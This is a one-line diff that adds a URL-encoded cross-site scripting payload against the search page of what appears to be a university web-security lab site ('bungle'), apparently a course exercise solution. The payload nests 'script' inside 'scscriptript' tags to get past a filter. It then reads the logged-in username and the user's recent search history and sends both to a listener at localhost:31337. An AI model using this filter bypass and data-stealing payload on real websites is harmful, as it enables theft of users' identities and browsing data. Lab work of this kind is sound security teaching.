@@ -1,0 +1,1 @@
+https://bungle.sysnet.ucsd.edu/search?q=%3Cscscriptript%3E%24%28function%28%29%7B%24.get%28%60http%3A%2F%2Flocalhost%3A31337%2F%3Fstolen_user%3D%24%7B%24%28%27%23logged-in-user%27%29.text%28%29%7D%26last_search%3D%24%7B%24%28%27.history-item%3Aeq%281%29%27%29.text%28%29%7D%60%29%3B%7D%29%3B%3C%2Fscscriptript%3E
